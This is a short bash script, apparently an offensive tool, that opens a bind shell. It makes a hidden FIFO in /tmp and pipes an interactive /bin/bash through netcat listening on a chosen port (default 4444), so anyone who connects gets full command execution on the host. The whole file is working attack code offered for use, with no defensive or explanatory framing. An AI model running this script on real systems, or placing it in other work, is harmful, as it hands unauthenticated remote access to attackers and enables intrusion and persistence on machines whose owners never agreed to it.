#!/bin/bash
# ==========================================
# Bind Shell Script
# ==========================================
# Usage: ./bind_shell.sh <PORT>
# Example: ./bind_shell.sh 4444
# ==========================================

set -e

PORT="${1:-4444}"
FIFO="/tmp/.f_$$"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${YELLOW}[*] Starting Bind Shell on port $PORT${NC}"

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    rm -f "$FIFO"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Create FIFO
rm -f "$FIFO"
mkfifo "$FIFO"

echo -e "${GREEN}[+] FIFO created: $FIFO${NC}"
echo -e "${GREEN}[+] Listening on port $PORT...${NC}"

# Start bind shell
cat "$FIFO" | /bin/bash -i 2>&1 | nc -nlvp "$PORT" > "$FIFO"
